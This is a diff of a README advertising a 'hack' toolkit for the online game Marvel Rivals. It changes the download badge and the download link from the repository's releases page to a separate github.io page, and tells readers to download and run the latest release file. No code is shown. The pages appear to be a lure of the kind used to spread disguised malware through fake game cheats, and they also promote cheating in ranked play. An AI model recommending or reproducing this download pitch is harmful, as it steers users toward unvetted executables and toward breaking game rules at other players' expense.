@@ -1,6 +1,6 @@
 <h1>🎮 marvel-rivals-hack-2026-ranked-hero-toolkit - Your Ultimate Ranked Companion for Victory</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lilx1883/marvel-rivals-hack-2026-ranked-hero-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://lilx1883.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Lilx1883/marvel-rivals-hack-2026-ranked-hero-toolkit/releases](https://github.com/Lilx1883/marvel-rivals-hack-2026-ranked-hero-toolkit/releases)
+Visit this link to download the application: [https://lilx1883.github.io](https://lilx1883.github.io)
 
 Once you're on the download page, look for the latest release file. Click the download button and wait for the file to finish downloading to your computer. The download should complete automatically – no special software needed.
 
